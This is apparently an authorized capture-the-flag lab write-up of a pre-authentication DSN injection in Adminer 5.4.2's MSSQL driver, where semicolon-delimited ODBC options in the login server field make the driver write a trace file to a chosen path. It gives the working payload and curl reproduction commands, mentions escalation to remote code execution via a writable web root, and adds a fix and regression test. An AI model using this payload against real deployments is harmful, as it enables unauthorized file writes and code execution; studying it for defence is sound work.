# Adminer 5.4.2 MSSQL DSN TraceFile Lab

## Metadata

- Date: 2026-06-10
- Target type: Authorized CTF/lab, whitebox challenge
- Target: `https://a6a401a24134.pwnbox-lab.com/`
- Adminer path: `https://a6a401a24134.pwnbox-lab.com/adminer.php`
- Local source reviewed: `labs/adminer-5.4.2.php`
- Advisory reviewed: `labs/voorivex-adminer-blog.html`
- Bug class: Pre-auth DSN injection to arbitrary file write
- Affected component: Adminer 5.4.2 MSSQL PDO driver
- Objective: Create `/tmp/pwn.txt` containing the text `flag`
- Result: Solved

## Final Flag

```text
pwnbox{7a9c4f8d2b6e1093ca5478912edcb036}
```

## What Is Happening

The lab exposes a front gate at `/` and Adminer 5.4.2 at `/adminer.php`.

The front gate watches this file:

```text
/tmp/pwn.txt
```

It releases the flag when that file contains:

```text
flag
```

The challenge hint says the shipped Adminer script is unmodified Adminer 5.4.2 and the MySQL and MS SQL drivers are enabled. The front page confirms the important runtime detail:

```text
pdo_sqlsrv plus Microsoft ODBC Driver 18 for SQL Server
```

This makes the MSSQL DSN injection issue from the referenced Adminer advisory the direct path.

## Why It Happens

### Observation

Adminer supports multiple database drivers from the login form. The login form accepts these unauthenticated fields:

```text
auth[driver]
auth[server]
auth[username]
auth[password]
auth[db]
```

For the MSSQL PDO path in Adminer 5.4.2, the user-controlled server value is inserted into a PDO SQL Server DSN.

Relevant local source:

```php
attach($N,$V,$F){
    list($Nd,$Rg)=host_port($N);
    return $this->dsn("sqlsrv:Server=$Nd".($Rg?",$Rg":""),$V,$F);
}
```

Source location in the downloaded single-file build:

```text
labs/adminer-5.4.2.php
```

The important behavior is that `host_port()` does not remove semicolons from normal host strings. Therefore this login input:

```text
127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
```

becomes this PDO DSN:

```text
sqlsrv:Server=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
```

Microsoft ODBC treats semicolons as connection-string option delimiters. That allows attacker-controlled ODBC options to be appended through the Adminer `server` field.

### Hypothesis

If the attacker sets:

```text
TraceFile=/tmp/pwn.txt
TraceOn=1
```

then the Microsoft ODBC driver should write a trace file before login succeeds.

If the attacker also sets:

```text
auth[username]=flag
```

then the trace file should contain the token `flag`, satisfying the front gate.

### Evidence

The referenced advisory describes this exact primitive:

- `auth[server]` controls the host part of the MSSQL DSN.
- Semicolons append ODBC options.
- `TraceFile` controls the trace output path.
- `TraceOn=1` enables tracing.
- The trace includes the connection metadata, including the submitted username.
- A valid SQL Server login is not required because the trace is written before authentication completes.

The lab page independently confirms the required extension and driver:

```text
pdo_sqlsrv
Microsoft ODBC Driver 18
```

The successful proof request returned this error:

```text
SQLSTATE[HYT00]: [Microsoft][ODBC Driver 18 for SQL Server]Login timeout expired
```

That confirms Adminer reached the vulnerable `pdo_sqlsrv` connection path.

## Source-To-Sink Path

### Source

Unauthenticated POST body sent to `/adminer.php`:

```text
auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
auth[username]=flag
```

### Transform

Adminer stores the submitted password in the PHP session, redirects to an auth URL, and later reads:

```text
SERVER
username
stored password
```

The `auth[server]` value becomes the MSSQL server identifier.

### Parser

Adminer calls `host_port($N)`.

For this payload, the input is not converted into a strict host and numeric port. The semicolon-delimited ODBC options remain part of the host string.

### Sink

Adminer concatenates the host into the SQL Server PDO DSN:

```php
"sqlsrv:Server=$Nd"
```

The sink is the Microsoft ODBC driver's DSN parser, reached through:

```php
new PDO($dsn, $username, $password, $options)
```

### Security Boundary

The trust boundary is crossed when unauthenticated HTTP input is treated as trusted DSN syntax for a native database driver.

### State Change

The native ODBC driver writes:

```text
/tmp/pwn.txt
```

before database authentication succeeds.

## Exact Test

### Step 1: Fetch the Adminer Login Page

This initializes the Adminer session cookies. This step matters because Adminer stores the password in the session before redirecting to the driver-specific URL.

```bash
curl -s \
  -c /tmp/adminer-cookies2.txt \
  -b /tmp/adminer-cookies2.txt \
  https://a6a401a24134.pwnbox-lab.com/adminer.php \
  >/tmp/adminer-login.html
```

### Step 2: Submit the MSSQL Login With Injected ODBC Trace Options

```bash
curl -i -L \
  -c /tmp/adminer-cookies2.txt \
  -b /tmp/adminer-cookies2.txt \
  https://a6a401a24134.pwnbox-lab.com/adminer.php \
  -d 'auth[driver]=mssql' \
  --data-urlencode 'auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1' \
  --data-urlencode 'auth[username]=flag' \
  --data-urlencode 'auth[password]=x' \
  --data-urlencode 'auth[db]='
```

### Step 3: Check the Front Gate

```bash
curl -s -L https://a6a401a24134.pwnbox-lab.com/ |
  rg -n 'Handshake|flag-card|pwnbox|received'
```

Expected signal:

```text
Handshake received
pwnbox{...}
```

Observed signal:

```text
Handshake received
pwnbox{7a9c4f8d2b6e1093ca5478912edcb036}
```

## Failed Attempt And Why It Failed

### Failed Test

The first attempt submitted the login POST and followed redirects, but did not first establish the normal Adminer session state.

```bash
curl -i -L \
  https://a6a401a24134.pwnbox-lab.com/adminer.php \
  -d 'auth[driver]=mssql' \
  --data-urlencode 'auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1' \
  --data-urlencode 'auth[username]=flag' \
  --data-urlencode 'auth[password]=x' \
  --data-urlencode 'auth[db]='
```

### Result

Adminer returned a login page and did not release the flag.

### Why It Failed

Adminer login is a two-step flow:

1. The POST stores credentials in the PHP session.
2. Adminer redirects to a URL like:

```text
/adminer.php?mssql=127.0.0.1...&username=flag
```

The redirected GET needs the same session so Adminer can retrieve the stored password and call `Driver::connect()`.

Without a proper cookie jar and initialized session, the redirected request can show:

```text
Session expired, please login again.
```

That means the request did not reliably reach the vulnerable connection sink.

## Result Interpretation

### Confirmed

The issue is confirmed because:

- The target exposes unmodified Adminer 5.4.2.
- The target confirms `pdo_sqlsrv` and Microsoft ODBC Driver 18.
- The source shows the server field concatenated into the `sqlsrv:` DSN.
- The proof request reaches the Microsoft ODBC driver.
- The front gate releases the flag after the proof request.

### Unknown

The exact byte layout of `/tmp/pwn.txt` is unknown because the challenge does not expose file readback. It likely contains a full ODBC trace, not only `flag`.

### Important Distinction

This lab did not require a web shell. The objective was only to make the watched file contain the token `flag`. The same primitive can be adapted to write a PHP file in a writable web root in vulnerable deployments, but that was unnecessary here.

## Finding

Pre-authenticated MSSQL DSN injection in Adminer 5.4.2 allows an unauthenticated attacker to control Microsoft ODBC trace options and write a trace file to an attacker-selected path.

## Root Cause

Adminer builds the MSSQL PDO DSN by string concatenation:

```php
"sqlsrv:Server=$Nd"
```

The value comes from the unauthenticated login form. It is parsed as driver connection-string syntax by ODBC. Adminer does not reject `;` or other DSN metacharacters before calling PDO.

## Evidence

Source:

```php
attach($N,$V,$F){
    list($Nd,$Rg)=host_port($N);
    return $this->dsn("sqlsrv:Server=$Nd".($Rg?",$Rg":""),$V,$F);
}
```

Proof request:

```text
auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
auth[username]=flag
```

Driver response:

```text
SQLSTATE[HYT00]: [Microsoft][ODBC Driver 18 for SQL Server]Login timeout expired
```

Challenge result:

```text
Handshake received
pwnbox{7a9c4f8d2b6e1093ca5478912edcb036}
```

## Reproduction

Run:

```bash
curl -s \
  -c /tmp/adminer-cookies2.txt \
  -b /tmp/adminer-cookies2.txt \
  https://a6a401a24134.pwnbox-lab.com/adminer.php \
  >/tmp/adminer-login.html

curl -i -L \
  -c /tmp/adminer-cookies2.txt \
  -b /tmp/adminer-cookies2.txt \
  https://a6a401a24134.pwnbox-lab.com/adminer.php \
  -d 'auth[driver]=mssql' \
  --data-urlencode 'auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1' \
  --data-urlencode 'auth[username]=flag' \
  --data-urlencode 'auth[password]=x' \
  --data-urlencode 'auth[db]='

curl -s -L https://a6a401a24134.pwnbox-lab.com/ |
  rg -n 'Handshake|flag-card|pwnbox|received'
```

## Impact

In this lab, impact is flag release through creation of `/tmp/pwn.txt`.

In a real exposed Adminer deployment with the same preconditions, impact may include arbitrary file write as the PHP worker user. If the web root is writable and the attacker can choose a PHP filename, this can become remote code execution.

## Exploitability Conditions

Required:

- Adminer 5.4.2 or vulnerable equivalent.
- MSSQL driver path reachable.
- `pdo_sqlsrv` loaded.
- Microsoft ODBC Driver installed.
- Target filesystem path writable by the PHP/ODBC process.
- Adminer reachable by the attacker.

Not required:

- Valid SQL Server credentials.
- A reachable SQL Server.
- Authentication to Adminer.

## Limitations

- If the target uses the non-PDO `sqlsrv` extension path, this specific PDO DSN primitive is not the same.
- If the ODBC driver disables tracing or rejects the trace options, this path may fail.
- If the target path is not writable, no file is created there.
- If the watcher expects exact file contents rather than substring matching, an ODBC trace file may not satisfy it. This lab accepted the trace because it contained `flag`.

## Fix

Reject DSN metacharacters in the MSSQL server field before constructing the DSN.

Minimum defensive behavior:

- Parse host and port strictly.
- Allow only valid hostname, IP literal, or socket formats expected by the driver.
- Allow only numeric port values in the valid range.
- Reject `;`, `{`, `}`, newline, carriage return, and other connection-string metacharacters.
- Do not pass raw user-controlled strings into DSN syntax.

Safer design:

- Use structured driver options where possible.
- Keep user-controlled host and port separate from driver option syntax.
- Add negative tests for injected ODBC options.

## Regression Test

Submit:

```text
auth[driver]=mssql
auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
auth[username]=flag
auth[password]=x
```

Expected fixed result:

```text
Invalid server value
```

or any equivalent validation error before `PDO::__construct()` is called.

Also assert:

```text
/tmp/pwn.txt is not created or modified
```

## Report Summary

Adminer 5.4.2 allows unauthenticated users to inject Microsoft ODBC connection-string options through the MSSQL login `server` field. The MSSQL PDO driver concatenates the supplied host into a `sqlsrv:` DSN without rejecting semicolon-delimited options. By submitting `TraceFile=/tmp/pwn.txt;TraceOn=1`, an attacker can make the ODBC driver write a trace file to an attacker-selected path before database authentication completes. In the challenge environment, setting the username to `flag` caused the trace file to contain the required token and released the flag.

## Learning Notes

### Pattern

Native database drivers often parse connection strings with their own grammar. If application code concatenates user input into that grammar, input validation must protect the downstream parser, not only the application's own idea of a host.

### Key Lesson

For parser-confusion bugs, compare:

- What the application thinks it is passing.
- What the downstream parser actually sees.
- Which delimiters or metacharacters change meaning across that boundary.

In this case:

```text
Application assumption: server is a hostname.
ODBC interpretation: server plus extra connection-string options.
```

### Checklist Item

When reviewing database admin tools or connection setup flows, test whether host/server fields are inserted into DSNs or connection strings. Specifically check semicolon-delimited options for ODBC, JDBC, SQL Server, and other connection-string formats.

## Knowledge Base Updates

Approved and completed:

- Created `writeups/adminer-mssql-dsn-tracefile-rce.md` as the clean final solution.
- Created `notes/dsn-connection-string-injection.md` for the general parser-confusion pattern.
- Created `payloads/mssql/odbc-tracefile-dsn-injection.md` for the minimal `TraceFile` and `TraceOn` payload shape.
- Created `checklists/dsn-connection-string-injection.md` for future database/admin-tool reviews.
